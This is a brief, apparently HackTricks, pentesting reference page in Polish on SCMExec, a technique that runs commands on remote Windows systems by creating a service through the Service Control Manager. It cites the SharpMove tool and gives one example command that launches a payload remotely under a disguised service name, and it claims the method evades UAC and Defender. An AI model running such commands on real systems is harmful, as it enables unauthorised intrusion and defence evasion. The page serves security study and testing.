# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** to technika wykonywania poleceń na zdalnych systemach za pomocą Menedżera Kontroli Usług (SCM), aby utworzyć usługę, która uruchamia polecenie. Metoda ta może omijać niektóre zabezpieczenia, takie jak Kontrola Konta Użytkownika (UAC) i Windows Defender.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

{{#include ../../banners/hacktricks-training.md}}
